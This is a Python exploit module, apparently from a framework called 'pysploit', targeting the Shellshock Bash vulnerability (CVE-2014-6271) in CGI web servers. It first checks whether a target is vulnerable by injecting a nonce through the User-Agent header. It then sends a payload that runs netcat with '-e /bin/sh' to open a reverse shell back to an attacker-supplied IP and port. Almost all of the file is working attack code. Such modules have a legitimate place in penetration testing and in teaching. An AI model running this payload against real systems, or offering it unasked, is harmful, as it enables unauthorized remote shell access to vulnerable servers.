"""
Exploit module for shellshock
"""
import uuid
import requests


from exploits.exploit import Exploit


class shellshock(Exploit):
	def __init__(self):	

		# Exploit information
		super().__init__()
		self.vuln_name = "shellshock"
		self.disclosure_ids = ["CVE-2014-6271"]
		self.vuln_reliability = "HIGH"
		self.vuln_type = "remote code execution"
		self.vuln_description = """
		This module exploits the Shellshock vulnerability by modifying HTTP headers
		in requests to CGI scripts running on Apache webservers.

		Shellshock, aka 'Bashdoor' is a Unix Bash shell bug disclosed on 09-24-2014.
		By abusing a 'function export' feature of Bash, attackers were able to execute
		privileged commands on vulnerable servers. Common manifestations of the
		vulnerability are found in:
		- CGI-based webservers
		- OpenSSH servers (via "ForceCommand" feature) 
		- Malicious DHCP server options (server -> client)
		- Qmail server
		- IBM Hardware Management Console Restricted Shell

		Example Vulnerability Test Command:

			env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

		[pysploit docs]
		"""

		# User-set options
		self.options = {
			"victim_ip": None,
			"victim_port": None,
			"attacker_ip": None,
			"attacker_port": None,
			"cgi_path": None,
			"payload": None
		}

	def check_vulnerability(self):
		"""
		Checks if target is vulnerable to shellshock
		Fingerprints vulnerablity status of the target by passing a function export that will return the string
		'vulnerable' if the target executes the passed function and passes the output of the echo in the response.

		:return: True if target is vulnerable, False if target is not vulnerable
		"""

		print("[*]\tChecking for vulnerability")
		# send a request with the test user agent header
		# generate a random string to pass in the header and check for in the response
		nonce = uuid.uuid4().hex
		vuln_user_agent = "() { :;};  echo Content-Type: text/plain ; echo ; echo -e " + nonce
		print("\t[*]\tInjecting with test nonce {}".format(nonce))
		res = self.send_request(vuln_user_agent)

		if nonce in res:
			print("\t[+]\tReceived vulnerable output from target!")
			print("\t[+]\tTarget {} is vulnerable to {}".format(self.options["victim_ip"], self.vuln_name))
			return True
		else:
			print("\t[-]\tDid not receive vulnerable output from target")
			print("\t[-]\tTarget {} is not vulnerable to {}".format(self.options["victim_ip"], self.vuln_name))
			return False

	def send_request(self, injection, timeout=None):
		vuln_url = "http://{}:{}/{}".format(self.options["victim_ip"], self.options["victim_port"],
											self.options["cgi_path"])
		headers = {
			"Host": self.options["victim_ip"],
			"User-Agent": injection,
			"Connection": "close",
		}
		if timeout is not None:
			req = requests.get(vuln_url, headers=headers, timeout=timeout)
			res = req.text
			return res
		else:
			req = requests.get(vuln_url, headers=headers)
			res = req.text
			return res

	def exploit(self):
		"""Runs the show."""

		is_vulnerable = self.check_vulnerability()

		if is_vulnerable:
			print("[*]\tRunning exploit for {} on {}".format(self.vuln_name, self.options["victim_ip"]))
			rev_shell = "/usr/bin/nc {} {} -e /bin/sh".format(self.options["attacker_ip"], self.options["attacker_port"])
			exploit_user_agent = "() { :;};  echo Content-Type: text/plain ; echo ; " + rev_shell
			self.send_request(exploit_user_agent, timeout=1)
			print("\t[+]\tShell injection sent (reverse catch at {}:{})".format(
				self.options["attacker_ip"],
				self.options["attacker_port"]
			))
			print("[+]\tExploitation completed!")
		else:
			print("[-]\tAborting exploit attempt.")

	def run(self):
		self.exploit()
